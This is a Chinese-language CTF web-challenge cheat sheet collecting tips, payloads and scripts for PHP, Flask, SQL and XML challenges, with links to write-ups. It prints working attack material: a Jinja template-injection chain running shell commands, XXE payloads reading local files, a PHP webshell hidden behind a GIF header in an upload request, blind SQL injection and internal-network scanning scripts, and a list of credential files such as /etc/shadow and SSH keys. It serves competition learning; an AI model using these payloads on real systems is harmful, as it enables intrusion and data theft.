    - `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("cmd").read()}}{%endif%}{% endfor %}`
    - https://sanlokii.eu/writeups/downunderctf/parrot-the-emu
    - [Charlie Hunt 1](https://abuctf.github.io/posts/NiteCTF2024)。不过这题[预期解](https://github.com/Cryptonite-MIT/niteCTF-2024/tree/main/webex/charlie_hunt_1)是找到当前类对象里的get_flag方法并调用

1. 当网站没有任何提示时，可以去看看一些敏感目录。

例如：

```
/robots.txt
/.git(这个目录有时候可以直接看，有时候会被forbidden。就算被forbidden了也证明这个目录是存在的，考点可能是git泄露。)
/www.zip（有时候会有网站源码）
```

不过这样蒙目录基本没啥用。建议进一步使用工具扫描目录。不过工具不是万能的，会出现漏扫的情况。尝试把线程调低或者手动检查一些简单的。

2. 永远不要忘记查看源代码以及开发者工具。

很多时候提示都会藏在注释里。还有甚者藏在服务器返回的http报文里，console里。这些都可以用chrome查看。network选项中可以记录报文，如果单纯就是看个报文也没必要专门开个bp。还有最重要的，一些php题包含flag后很有可能包含在注释里，网页直接是看不到的。这时候不看源代码错过flag真的太冤了。

3. 要有bp抓包和改包的习惯。

抓包可以最清楚看到发送了什么东西，接收了什么东西。改包是为了让客户端发出去一些非预期内容，测试能不能触发隐藏bug。

4. flask session伪造

[例题](../../CTF/ctfshow/Web/抽老婆.md)。这题还有个任意文件下载的考点，也很经典。

5. [php伪协议](https://segmentfault.com/a/1190000018991087)

[例题](../../CTF/攻防世界/1级/Web/fileclude.md)。很多时候用来读取源代码，标志函数为include函数系列。注意php://filter伪协议还可以套另一层协议，不一定非要写`php://filter/read=convert.base64-encode/resource=flag.php`这类的，写`php://filter/read=convert.base64-encode/xxx/resource=flag.php`也行，xxx自定，可用于绕过滤。如[这道题](https://blog.csdn.net/mochu7777777/article/details/105204141)。或者大小写混用，不要read也可以:`pHp://filter/convert.baSe64-encode/resource=/flag`。如果base64等关键字符被过滤了，可以考虑双urlencode绕过，如`php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=flag.php`。[例题2](https://blog.csdn.net/m0_56059226/article/details/119758074)，使用zip伪协议，这个协议忽视后缀，不是zip，例如jpg后缀也可以读取。格式为`zip://[压缩文件绝对路径（网站上相对路径也行）]%23[压缩文件内的子文件名（木马）]（#编码为%23，#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码）`。

1. php preg_replace函数/e选项会导致命令执行

这篇[文章](https://xz.aliyun.com/t/2557)讲的很好。[ics-05](../../CTF/攻防世界/3级/Web/ics-05.md)是一道关于该漏洞的例题。还有和文章中提到的利用方法思路完全一样的题：[[BJDCTF2020]ZJCTF，不过如此](../../CTF/BUUCTF/Web/[BJDCTF2020]ZJCTF，不过如此.md)。

7. php rce之<?=和反引号的利用。例题：[RCE挑战1](../../CTF/ctfshow/Web/RCE挑战1.md)

8. php无字母数字rce之自增利用。例题：[RCE挑战2](../../CTF/ctfshow/Web/RCE挑战2.md)
9. xml基本xxe利用。例题：[[NCTF2019]Fake XML cookbook](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)。注意[svg文件](https://baike.baidu.com/item/SVG%E6%A0%BC%E5%BC%8F/3463453)也是基于xml开发的，同样也有xxe。例题:[[BSidesCF 2019]SVGMagic](https://blog.csdn.net/shinygod/article/details/124052707)
```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY flag SYSTEM  "file:///flag.txt">
]>
<user>
	<name>&flag;</name>
</user>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///flag.txt" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
10. shell命令执行常见[绕过](https://blog.51cto.com/m0re/3879244)
11. [md5碰撞](https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value)。这是一些hex编码下内容不同却能产生相同md5值的字符串。
12. 一些在黑名单过滤时可互相交换的命令
- 查看目录
> ls<Br>dir
- 输出文件内容
> cat<br>[sort](https://www.cnblogs.com/51linux/archive/2012/05/23/2515299.html)。sort本是排序命令，但是默认会把执行后的结果输出到终端。<Br>[tail](https://www.runoob.com/linux/linux-comm-tail.html)，默认显示文件尾部的内容。由于flag文件基本不会超过十行，所以作用差不多<br>tac，倒序输出文件内容
1.  [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
2.  php md5相关特性。
- md5原始二进制利用+0e绕过md5弱等于+数组绕过md5强等于：[Easy MD5](../../CTF/BUUCTF/Web/Easy%20MD5.md)。
- 一个0e开头且其md5值也是0e开头的字符串，可用于弱等于：`0e215962017`
1.  php 5 intval特性：intval会截断科学计数法下的字符串，但当以科学计数法表示的字符串进行运算后便不会截断，会返回其运算后的值。例题：[[WUSTCTF2020]朴实无华](../../CTF/BUUCTF/Web/[WUSTCTF2020]朴实无华.md)
2.  githacker基本命令
- githacker --url http://example.com/.git --output-folder ./output

1.  多文件内寻找可用shell脚本。今天遇见一道题，整个网站全是后门文件，然而只有一个是有用的。算是fuzz题的变种，可以用以下多线程脚本找到。

```python
import os
import requests
import re
import threading
import time

print('开始时间： '+ time.asctime(time.localtime(time.time()))) 
s1 = threading.Semaphore(100)
filePath = r"src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('tring  '+file+'   '+time.asctime(time.localtime(time.time())))
    with open(file,encoding='utf-8') as f:
        gets = list(re.findall('\$_GET\[\'(.*?)\'\]',f.read()))
        posts = list(re.findall('\$_POST\[\'(.*?)\'\]',f.read()))
    data = {}
    params = {}
    for m in gets:
        params[m] = "echo '123456';"
    for n in posts:
        data[n] = "echo '123456';"
    url = "此处填本地网站地址" +file  #远程的也能post和get到，但是不知道为啥fuzz不出来
    req = session.post(url,data=data,params=params)
    req.close()
    req.encoding = 'utf-8'
    content=req.text
    if '123456' in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '123456';")
            content =req.text
            req.close()
            if "123456" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '123456';"})
                content =req.text
                req.close()
                if "123456" in content:
                    break
        if flag == 1:
            params = a
        else:
            params = b
        print('找到了利用文件： ' + file +"  and 找到了利用的参数：%s" %params)
        print('结束时间： '+time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content,args=(i,))
    t.start()
```

题目及来源：[[强网杯 2019]高明的黑客](https://blog.csdn.net/qq_51684648/article/details/120167176)

19. php extract变量覆盖+反序列化逃逸漏洞。例题:[[安洵杯 2019]easy_serialize_php](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_serialize_php.md)

20. python unicodedata.numeric 漏洞。例题：[[ASIS 2019]Unicorn shop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BASIS%202019%5DUnicorn%20shop.md)

21. php魔术方法：[官方文档](https://www.php.net/manual/zh/language.oop5.magic.php)。例题：[[MRCTF2020]Ezpop](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5DEzpop.md)

22. php [->,=>和::符号详解](https://segmentfault.com/a/1190000008600674)。

23. 命令注入的nmap利用：-oG选项写shell并绕过php escapeshellarg和escapeshellcmd函数。例题：[[BUUCTF 2018]Online Tool](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBUUCTF%202018%5DOnline%20Tool.md)

24. [php特殊标签绕过滤](https://www.cnblogs.com/jinqi520/p/11417365.html)
25. php利用数学函数构造任意shell。例题：[[CISCN 2019 初赛]Love Math](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BCISCN%202019%20%E5%88%9D%E8%B5%9B%5DLove%20Math.md)
26. 当题目有提到“检查ip”，“只有我自己……”等有关获取ip的内容时，可以考虑是否在xff上做了手脚，比如我们能把xff改为127.0.0.1来伪造本机，甚至是执行模板注入。例题:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
27. flag可能会出现在phpinfo界面的Environment里，有时候是因为出题人配置错误，有时候就是这么设计的。例题：[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
28. sql注入。
- 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
- updatexml报错注入。例题:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
- 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
- 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
    - 当过滤太多，无法获取数据库中账号信息但需要登录时使用。或者当数据库里压根就没有信息但仍需要登录时使用。如果是后者，也可以去sqlite_master里随便查出信息来用:`union select rootpage, type, name from sqlite_master --`，因为sqlite_master里一定是有值的
- 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
  - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
```python
import requests
url="http://62.173.140.174:26001/user.php"
def payload(i, j):
    # 数据库名字
    #sql = f"test'/**/and/**/if(ascii(substr(database(),{i},1))>{j},1,0)#"
    # 表名
    #sql = f"test'/**/and/**/if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='data'),{i},1))>{j}),1,0)#"
    # 列名
    # sql = f"test'/**/and/**/if((ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),{i},1))>{j}),1,0)#"
    # 查询flag
    sql = f"test'/**/and/**/if((ord(substr((select(group_concat(flag))from(flags)),{i},1))>{j}),1,0)#"
    data={'login':sql,'password':'test'}
    r = requests.get(url, params=data)
    if "User" in r.text:
       res = 1
    else:
       res = 0
    return res
def exp():
    flag=""
    for i in range(1, 10000):
        low = 31
        high = 127
        while low <= high:
              mid = (low + high) // 2
              res = payload(i, mid)
              if res:
                 low = mid + 1
              else:
                 high = mid - 1
        f = int((low + high + 1)) // 2
        if (f == 127 or f == 31):
           break
        flag += chr(f)
        print(flag)
exp()
```  
- sql正则regexp+二次注入+updatexml报错注入。例题:[[RCTF2015]EasySQL](../../CTF/BUUCTF/Web/[RCTF2015]EasySQL.md)
29. php使用读取文件的不同方式，可用于绕过滤。

```php
system("cat /flag");
file_get_contents("/flag");
readfile("/flag");
highlight_file("/flag");
show_source("flag.php")
```

30. MD5hash长度扩展攻击+chrome利用代码添加cookie。例题：[[De1CTF 2019]SSRF Me](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BDe1CTF%202019%5DSSRF%20Me.md)
31. ssi注入漏洞。例题:[[BJDCTF2020]EasySearch](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BBJDCTF2020%5DEasySearch.md)
32. idna编码+utf-8解码造成的过滤绕过。例题:[[SUCTF 2019]Pythonginx](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSUCTF%202019%5DPythonginx.md)
33. php反序列化逃逸+数组绕过strlen检查。例题1:[[0CTF 2016]piapiapia](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B0CTF%202016%5Dpiapiapia.md)；例题2:[baby_unserialize](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Web/baby_unserialize.md)
34. php普通无字母数字getshell+绕过disable functions
35. chrome console发送post请求

[来源](https://cloud.tencent.com/developer/article/1805343)

```js
var url = "http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/secrettw.php";

var params = "Merak=a";

var xhr = new XMLHttpRequest();

xhr.open("POST", url, true);

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 

xhr.onload = function (e) {

  if (xhr.readyState === 4) {

    if (xhr.status === 200) {

      console.log(xhr.responseText);

    } else {

      console.error(xhr.statusText);

    }

  }

};

xhr.onerror = function (e) {

  console.error(xhr.statusText);

};

xhr.send(params);
```

36. PHP会将传参中的空格( )、小数点(.)自动替换成下划线。例题:[[MRCTF2020]套娃](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83.md)
37. 以下代码可传入23333%0a绕过。可以说末尾加个%0a是绕过`^xxx$`这个格式的普遍解法，因为preg_match只能匹配一行数据，无法处理换行符。
```php
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

38.  php pcre回溯限制绕过preg_match。例题:[[FBCTF2019]RCEService](../../CTF/BUUCTF/Web/[FBCTF2019]RCEService.md)
39.  php basename特性+$_SERVER['PHP_SELF']使用+url解析特性。例题:[[Zer0pts2020]Can you guess it?](../../CTF/BUUCTF/Web/[Zer0pts2020]Can%20you%20guess%20it.md)
40.  python pickle反序列化漏洞+jwt爆破secret key。例题:[bilibili](../../CTF/攻防世界/9级/Web/bilibili.md)。pickle也可以用来反弹shell。例题:[[watevrCTF-2019]Pickle Store](https://blog.csdn.net/mochu7777777/article/details/107589233)
41.  python flask模板注入脚本查找subprocess.Popen索引。

[来源](https://blog.csdn.net/mochu7777777/article/details/107589811)

```python
import requests 
import re 
import html 
import time 
index = 0 
for i in range(170, 1000): 
    try: 
        url = "http://e5df30ec-7e81-425e-b1cf-0988f6f9ae6f.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}" 
        r = requests.get(url) 
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text) 
        time.sleep(0.1)
        # print(res) 
        # print(r.text) 
        res = html.unescape(res[0]) 
        print(str(i) + " | " + res) 
        if "subprocess.Popen" in res: 
            index = i 
            break 
    except: 
        continue
print("index of subprocess.Popen:" + str(index))
```

42. 使用[php_mt_seed](https://www.openwall.com/php_mt_seed/)爆破php伪随机数函数[mt_rand](https://www.freebuf.com/vuls/192012.html)种子。例题:[[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/shinygod/article/details/124067962)
43. linux可读取的敏感文件。

[来源](https://www.shawroot.cc/1007.html)

```
/etc/passwd
/etc/shadow
/etc/hosts
/root/.bash_history //root的bash历史记录，每个用户的家目录下都有这么一个文件
/root/.ssh/authorized_keys
/root/.mysql_history //mysql的bash历史记录
/root/.wget-hsts
/opt/nginx/conf/nginx.conf //nginx的配置文件
/var/www/html/index.html
/etc/my.cnf
/etc/httpd/conf/httpd.conf //httpd的配置文件
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/proc/config.gz
/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/proc/mounts // 挂载的文件系统列表
/proc/net/arp //arp表，可以获得内网其他机器的地址
/proc/net/route //路由表信息
/proc/net/tcp and /proc/net/udp // 活动连接的信息
/proc/net/fib_trie // 路由缓存,可用于泄露内网网段
/proc/version // 内核版本
//以下文件若不知道PID，用self代替也可以
/proc/[PID]/cmdline // 可能包含有用的路径信息
/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell。也有例如flask的题目会把SECRET KEY放里面
/proc/[PID]/cwd // 当前进程的工作目录
/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
/proc/self/cmdline //获取当前启动进程的完整命令
/proc/self/mem   //进程的内存内容。注意该文件内容较多而且存在不可读写部分，直接读取会导致程序崩溃。需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。
/proc/self/maps  //当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。
/root/.ssh/id_rsa
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/etc/ssh/sshd_config
/var/log/secure
/etc/sysconfig/network-scripts/ifcfg-eth0
/etc/syscomfig/network-scripts/ifcfg-eth1
/sys/class/net/eth0/address //eth0网卡的MAC地址
```

44. 基础[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)探测内网网段脚本。

题目及来源:[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Article-kelp/p/16026652.html)

```python
import requests as res
url="http://9b0cf961-6439-461e-862f-882833e83736.node4.buuoj.cn:81/doLogin.php"
rawPayload='<?xml version="1.0"?>'\
         '<!DOCTYPE user ['\
         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
         ']>'\
         '<user>'\
         '<username>'\
         '&payload1;'\
         '</username>'\
         '<password>'\
         '23'\
         '</password>'\
         '</user>'
for i in range(1,256):
    payload=rawPayload.format(i)
    #payload=rawPayload
    print(str("#{} =>").format(i),end='')
    try:
        resp=res.post(url,data=payload,timeout=0.3)
    except:
        continue
    else:
        print(resp.text,end='')
    finally:
        print('')
```

45. php phar反序列化漏洞。例题:[[CISCN2019 华北赛区 Day1 Web1]Dropbox](../../CTF/BUUCTF/Web/[CISCN2019%20华北赛区%20Day1%20Web1]Dropbox.md)
46. php文件上传一句话木马最基础绕过。在木马的开头加上GIF89a，上传文件时抓包改`Content-Type:`为图片。注意木马文件的`Content-Type:`改成什么都没事，重要的是后缀名。如果为了绕过过滤不得不改后缀名，就需要后续找别的漏洞把后缀改回来或者直接包含文件。

```php
GIF89a

<?php @eval($_POST['shell']);?>
````

包如下（仅截取上传部分）：

```
------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="upload_file"; filename="shell.php" //这个名字很重要，保留php后缀名就能直接蚁剑连，否则需要找别的漏洞
Content-Type: image/png //改成png，能绕过过滤的都行

GIF89a

<?php @eval($_POST['shell']);?>

------WebKitFormBoundaryXSmMYBArrqu5ODCM
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryXSmMYBArrqu5ODCM--
```
最近找到了个更短的：
```php
<?=`$_GET[0]`?>
```
更多参考 https://github.com/bayufedra/Tiny-PHP-Webshell

47. sql注入如果没有过滤load_file，就能直接读取文件。例如：
- ',\`address\`=(select(load_file('/flag.txt')))#
可以直接在不爆表爆字段等任何信息的情况下直接读取到flag.txt文件。

48.  [linux proc/pid/信息说明](https://blog.csdn.net/shenhuxi_yu/article/details/79697792)。/proc/self/cmdline可以读取当前进程执行的命令，如果是python的网站可以借此读取到网站的文件名。linux中如果打开了一个文件且没有关闭的话，`/proc/pid/fd/文件描述符`  这个目录会包含了进程打开的每一个文件，比如/proc/pid/fd/3读取第一个打开的文件。在python里使用open打开的只要不close，都能猜文件描述符而读取到。例题:[[网鼎杯 2020 白虎组]PicDown](https://blog.csdn.net/wuyaowangchuan/article/details/114540227)
49. perl GET命令执行漏洞。例题:[[HITCON 2017]SSRFme](../../CTF/BUUCTF/Web/[HITCON%202017]SSRFme.md)
50. jwt可以通过将alg修改为none来实现无加密伪造。需要使用PyJWT第三方库。例题:[[HFCTF2020]EasyLogin](https://blog.csdn.net/qq_25500649/article/details/118597363)。也可以参考[you-can-trust-me](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/you-can-trust-me.md)，使用[jwt_tool](https://github.com/ticarpi/jwt_tool)
51. [koa框架结构](https://www.cnblogs.com/wangjiahui/p/12660093.html)。
52. 无列名注入+布尔盲注。例题:[[GYCTF2020]Ezsqli](https://blog.csdn.net/qq_45521281/article/details/106647880)(里面最后一道例题)
53. sql多行二次注入+git目录泄漏+.DS_Store泄露。例题:[comment](../../CTF/攻防世界/7级/Web/comment.md)
54. sql注入中，空格能用内联注释符`/**/`或tab键代替，似乎`/*/`和`//`也可以；如果注释符`#`被过滤，可以用`;%00`替代，截断注释后面的内容。
55. regexp盲注。例题:[[NCTF2019]SQLi](https://blog.csdn.net/l2872253606/article/details/125265138)
56. [Arjun](https://github.com/s0md3v/Arjun) http参数爆破工具。
57. 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个木马，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破并连接木马就可以getshell。来自[php文件操作trick](https://www.cnblogs.com/tr1ple/p/11301743.html)。更多参考[PHP临时文件机制](https://www.cnblogs.com/linuxsec/articles/11278477.html)。例题:[[NPUCTF2020]ezinclude](https://www.cnblogs.com/Article-kelp/p/14826360.html)
58. 在json中可以使用unicode编码进行转义。如下面两种写法都可以被正确解析。

```
{"poc":"php"}
{"poc":"\u0070\u0068\u0070"}
```

可用于绕过滤。

59. [file_get_contents("php://input")的用法](https://www.cnblogs.com/jiangxiaobo/p/10723031.html)
60. 字符直接和0xFF异或相当于取反。
61. 利用.htaccess文件上传漏洞时，注意php_value auto_append_file的路径可以写php伪协议，这样能用于绕过某些过滤。比如程序过滤了`<?`，我们能够把马base64编码，再上传带有`php_value auto_append_file "php://filter/convert.base64-decode/resource=xxx`的.htaccess文件就能正常使用马了。
62. php绕过exif_imagetype()检测+[open_basedir bypass](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)。例题:[[SUCTF 2019]EasyWeb](../../CTF/BUUCTF/Web/[SUCTF%202019]EasyWeb.md)
63. render_template_string处可能会有python的flask ssti。
64. sql注入逗号被过滤时的绕过[方法](https://www.jianshu.com/p/d10785d22db2)。
65. sql注入弱类型相加。例题:[[网鼎杯2018]Unfinish](https://blog.csdn.net/rfrder/article/details/109352385)
66. 由不安全的SessionId导致的[ThinkPHP6 任意文件操作漏洞](https://paper.seebug.org/1114/)。例题:[[GYCTF2020]EasyThinking](https://blog.csdn.net/mochu7777777/article/details/105160796)
67. php中xxx session内容会被存储到/runtime/session/sess_xxx中。session默认存储文件名是sess_+PHPSESSID
68. php的\$_SERVER['QUERY_STRING']不会对传入键值对进行url解码。
69. php中虽然\$_REQUEST同时接收GET和POST的传参，但POST拥有更高的优先级，当\$_GET和\$_POST中的键相同时，\$_POST的值将覆盖\$_GET的值。
70. php sha1加密数组绕过+extract变量覆盖漏洞+create_function代码注入。例题:[[BJDCTF2020]EzPHP](../../CTF/BUUCTF/Web/[BJDCTF2020]EzPHP.md)
71. 代码执行题可通过输入Error().stack测试后台代码是不是js。
72. js [vm2沙箱逃逸](https://www.anquanke.com/post/id/207291)。例题:[[HFCTF2020]JustEscape](https://blog.csdn.net/SopRomeo/article/details/108629520)
73. web爬虫计算脚本。

[例题及来源](https://blog.csdn.net/qq_46263951/article/details/118914287)

```python
import re
import requests
from time import sleep
def count():
    s = requests.session()
    url = 'http://4cf5d9ba-2df8-4b52-88ff-5fcbd27c5fc9.node4.buuoj.cn:81/'
    match = re.compile(r"[0-9]+ [+|-] [0-9]+")
    r = s.get(url)
    for i in range(1001):
        sleep(0.1)
        str = match.findall(r.text)[0]
        # print(eval(str))
        data = {"answer" : eval(str)}
        r = s.post(url, data=data)
        r.encoding = "utf-8"
        # print(r.text)
    print(r.text)
if __name__ == '__main__':
    count()
```

74. post上传题目fuzz脚本。

[例题及来源](https://blog.csdn.net/mochu7777777/article/details/107729445),这题还有个汉字取反getshell

```python
# -*- coding:utf-8 -*-
# Author: m0c1nu7
import requests

def ascii_str():
	str_list=[]
	for i in range(33,127):
		str_list.append(chr(i))
	#print('可显示字符：%s'%str_list)
	return str_list

def upload_post(url):
	str_list = ascii_str()
	for str in str_list:
		header = {
		'Host':'3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn',
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
		'Accept-Encoding':'gzip, deflate',
		'Content-Type':'multipart/form-data; boundary=---------------------------339469688437537919752303518127'
		}
		post = '''-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

12345'''+str+'''
-----------------------------339469688437537919752303518127
Content-Disposition: form-data; name="submit"

提交			
-----------------------------339469688437537919752303518127--'''

		res = requests.post(url,data=post.encode('UTF-8'),headers=header)
		if 'Stored' in res.text:
			print("该字符可以通过:  {0}".format(str))
		else:
			print("过滤字符:  {0}".format(str))
			


if __name__ == '__main__':
	url = 'http://3834350a-887f-4ac1-baa4-954ab830c879.node3.buuoj.cn/index.php?act=upload'
	upload_post(url)
```

75. union select跨库查询+sqlmap的基本使用。例题:[[b01lers2020]Life on Mars](https://blog.csdn.net/mochu7777777/article/details/107725530)
76. 当上传xml遇到waf时，在没有任何提示的情况下，可以尝试将UTF-8编码转为UTF-16编码绕过。
- iconv -f utf8 -t utf-16 1.xml > 2.xml
77. ruby ERB模板注入+预定义变量。例题:[[SCTF2019]Flag Shop](../../CTF/BUUCTF/Web/[SCTF2019]Flag%20Shop.md)
78. php require_once绕过。例题:[[WMCTF2020]Make PHP Great Again](https://www.anquanke.com/post/id/213235)
79. 巧用函数嵌套绕过滤读文件（利用scandir配合next，current等函数取出文件名）。例题:[[GXYCTF2019]禁止套娃](../../CTF/BUUCTF/Web/[GXYCTF2019]禁止套娃.md)
80. php finfo_file()函数仅识别PNG文件十六进制下的第一行信息，即文件头信息。而getimagesize()函数则会检测更多东西：

```
索引 0 给出的是图像宽度的像素值
索引 1 给出的是图像高度的像素值
索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签
索引 bits 给出的是图像的每种颜色的位数，二进制格式
索引 channels 给出的是图像的通道值，RGB 图像默认是 3
索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header("Content-type: image/jpeg");
```

例题及来源:[[HarekazeCTF2019]Avatar Uploader 1](https://blog.csdn.net/weixin_44037296/article/details/112604812)

81. php使用内置类Exception 和 Error绕过md5和sha1函数。例题:[[极客大挑战 2020]Greatphp](https://blog.csdn.net/LYJ20010728/article/details/117429054)
82. php [parse_url解析漏洞](https://www.cnblogs.com/tr1ple/p/11137159.html)。再给出一个比较简短的[参考](https://blog.csdn.net/q1352483315/article/details/89672426)。例题:[[N1CTF 2018]eating_cms](https://blog.csdn.net/mochu7777777/article/details/105337682),这题还有个文件名命令注入。该题的关键点在于伪协议读取源码，但关键文件名被过滤。url经过parse_url过滤，所以构造`//user.php?page=php://filter/convert.base64-encode/resource=upllloadddd.php`来绕过过滤。注意题目的php版本是5.5.9，现在7+版本运行结果会不一样。

```php
<?php
$url6 = "//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg";
$keywords = ["flag","manage","ffffllllaaaaggg","info"];
$uri=parse_url($url6);
var_dump($uri);
parse_str($uri['query'], $query);
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                echo 'no1';
            if (stristr($v, $token))
                echo 'no2';
        }
    }
'''
7+
array(2) {
  ["host"]=>
  string(8) "user.php"
  ["query"]=>
  string(64) "page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
no2
'''

'''
5.5.9
array(2) {
  ["host"]=>
  string(17) "user.php?page=php"
  ["path"]=>
  string(55) "//filter/convert.base64-encode/resource=ffffllllaaaaggg"
}
'''
```

发现7+版本解析正常，而5.5.9版本把url的query解析成了path，自然就能绕过过滤了。同时，多加一条斜线不会影响apache解析路径。

83. sqlmap使用[参考](https://www.freebuf.com/sectool/164608.html)。
84. php引用赋值。例题:[BUU CODE REVIEW 1](https://blog.csdn.net/qq_45555226/article/details/110003144)
85. 伪造内网ip的几种方式。

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
X-Client-IP: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Real-ip: 127.0.0.1
X-rewrite-url: secret.php //这个是bypass 403
```

1.  [使用curl发送post请求](https://blog.csdn.net/m0_37886429/article/details/104399554)。
2.  [存储型xss](https://www.ddddy.icu/2022/03/31/%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/)。
3.  linux下，/proc/self/pwd/代表当前路径。
